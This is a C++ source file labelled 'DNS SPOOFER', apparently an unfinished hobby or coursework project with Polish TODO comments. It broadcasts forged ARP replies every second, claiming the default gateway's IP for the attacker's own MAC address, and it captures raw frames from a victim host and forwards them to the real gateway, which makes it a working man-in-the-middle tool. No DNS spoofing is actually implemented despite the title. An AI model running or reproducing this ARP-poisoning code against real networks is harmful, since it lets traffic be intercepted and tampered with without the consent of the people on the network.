/*
 *                           DNS SPOOFER
 * Compilation:  gcc -Wall ./dnspoof.c -o dnspoof -lnet -lpthread
 * Usage:        ./dnspoog INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC
 * NOTE:         This program requires root privileges.
 *
 */

#include <unistd.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <csignal>

#include <thread>
#include <chrono>
#include <iostream>


// TODO
// 3. capture - zasymulować ip forward
//   - filtr na pcap
//   - przesyłanie dalej

libnet_t *ln;
int sfd;

void *spoof(const char *interface_name, char *address) {
    // TODO sprawdzić czy to libnet_init można wyciągnąć przed while itp.
    u_int32_t target_ip_addr, zero_ip_addr;
    u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
            zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    struct libnet_ether_addr *src_hw_addr;
    char errbuf[LIBNET_ERRBUF_SIZE];

    ln = libnet_init(LIBNET_LINK, interface_name, errbuf);
    // Returns the MAC address for the device libnet was initialized with:
    src_hw_addr = libnet_get_hwaddr(ln);
    // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address:
    target_ip_addr = libnet_name2addr4(ln, address, LIBNET_RESOLVE);
    // This may incur a DNS lookup if mode is set to LIBNET_RESOLVE and host_name refers to a canonical DNS name.
    zero_ip_addr = libnet_name2addr4(ln, const_cast<char *>("0.0.0.0"), LIBNET_DONT_RESOLVE);

    libnet_autobuild_arp(
            ARPOP_REPLY,                     /* operation type       */
            src_hw_addr->ether_addr_octet,   /* sender hardware addr */ // nasz MAC
            (u_int8_t *) &target_ip_addr,     /* sender protocol addr */ // adres IP bramy
            zero_hw_addr,                    /* target hardware addr */ // dowolny MAC zapytał
            (u_int8_t *) &zero_ip_addr,       /* target protocol addr */ // -,,-
            ln);                             /* libnet context       */
    libnet_autobuild_ethernet(
            bcast_hw_addr,                   /* ethernet destination */
            ETHERTYPE_ARP,                   /* ethertype            */
            ln);                             /* libnet context       */

    while (true) {// TODO sigint
        libnet_write(ln);
        std::chrono::seconds sec = std::chrono::seconds(1);
        std::this_thread::sleep_for(sec);
    }

}

void *capture(char *interface_name, char* deafault_gateway_mac) {
    struct ifreq interface_struct;          // interface structure -> needed for interface identification

    // RECEIVE SOCKET
    struct sockaddr_ll sall;                // address sockeet structure -> for binding

    sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));        // get socket's descriptor no
    strncpy(interface_struct.ifr_name, interface_name, IFNAMSIZ);   // read interface name and save it to interface_struct
    ioctl(sfd, SIOCGIFINDEX, &interface_struct);                    // get interface index from query (based on interface_struct)
    memset(&sall, 0, sizeof(struct sockaddr_ll));                   // fill sall structure with zeros

    // FILL sall structure with info:
    sall.sll_family = AF_PACKET;                                    // always AF_PACKET
    sall.sll_protocol = htons(ETH_P_ALL);                           // frames from everyone
    sall.sll_ifindex = interface_struct.ifr_ifindex;                // interface index
    sall.sll_hatype = ARPHRD_ETHER;
    sall.sll_pkttype = PACKET_HOST;
    sall.sll_halen = ETH_ALEN;                                      // MAC address size

    // bind sfd descriptor with sall structure:
    bind(sfd, (struct sockaddr *) &sall, sizeof(struct sockaddr_ll));

    // SEND SOCKET
    int sfd_send;
    struct sockaddr_ll sall_send;                    

    sfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    strncpy(interface_struct.ifr_name, interface_name, IFNAMSIZ);
    memset(&sall_send, 0, sizeof(struct sockaddr_ll));
    sall_send.sll_family = AF_PACKET;
    sall_send.sll_protocol = htons(ETH_P_ALL);
    sall_send.sll_ifindex = interface_struct.ifr_ifindex;
    sall_send.sll_hatype = ARPHRD_ETHER;
    sall_send.sll_pkttype = PACKET_OUTGOING;
    sall_send.sll_halen = ETH_ALEN;

    while (true) {// TODO sigint
        // ALLOCATE MEMORY FOR FRAME
        char *frame = static_cast<char *>(malloc(ETH_FRAME_LEN));
        memset(frame, 0, ETH_FRAME_LEN);
        struct ethhdr *fhead = (struct ethhdr *) frame;

        // RECEIVE frame
        ssize_t len;
        len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, nullptr, nullptr);

        // TODO wziąć zapytania na bramę i wysłać je tam (zmienić adres MAC - wprowadzany z linii poleceń)
        // DESTINATION IP           : DEFAULT GATEWAY
        // DESTINATION MAC ADDRESS  : MY COMPUTER'S ID
        if (fhead->h_source[5] == 62 && fhead->h_dest[5] == 78) { // TODO póki co odbieramy tylko pakiety z mojego drugiego laptopa :)
            // PRINT
            printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int) len,
                   fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
                   fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
            printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
                   fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
                   fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);


            printf("\n\n");

            // SEND FRAME
            // Change destination address to default gateway MAC
            sscanf(deafault_gateway_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &sall_send.sll_addr[0], &sall_send.sll_addr[1], &sall_send.sll_addr[2],
                   &sall_send.sll_addr[3], &sall_send.sll_addr[4], &sall_send.sll_addr[5]);
            sfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
            memcpy(fhead->h_dest, &sall_send.sll_addr, ETH_ALEN);

            ioctl(sfd_send, SIOCGIFHWADDR, &interface_struct);
            memcpy(fhead->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);

            if (sendto(sfd_send, frame, (int)len, 0,(struct sockaddr*) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
               printf("Error while sending: %s\n", strerror(errno));
            } else {
               printf("Message sent!\n");
            }
        }

        close(sfd_send);
        free(frame);
    }
}

void stop(int signal) {
    // TODO clean memory
    libnet_destroy(ln);
    close(sfd);
    exit(EXIT_SUCCESS);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        std::cerr << "Bad arguments count! Arguments are: INTERFACE DEFAULT_GATEWAY_IP DEFAULT_GATEWAY_MAC\n";
        exit(EXIT_FAILURE);
    }

    std::signal(SIGINT, stop);

    std::thread arp_spoofer(spoof, argv[1], argv[2]);
    std::thread capturer(capture, argv[1], argv[3]);

    arp_spoofer.join();
    capturer.join();

    return 0;
}
